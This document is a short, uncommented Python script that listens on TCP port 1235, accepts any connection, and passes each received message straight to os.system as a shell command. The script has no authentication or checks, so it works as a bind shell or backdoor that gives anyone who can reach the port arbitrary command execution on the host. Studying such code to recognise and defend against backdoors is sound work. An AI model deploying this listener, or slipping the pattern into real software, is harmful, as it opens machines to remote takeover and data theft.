import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((socket.gethostname(), 1235))
s.listen(5)

while True:
    clientsocket, address = s.accept()
    print(f"Connected to client {address}...")
    msg = clientsocket.recv(1024)
    cmd = msg.decode("utf-8")
    os.system(cmd)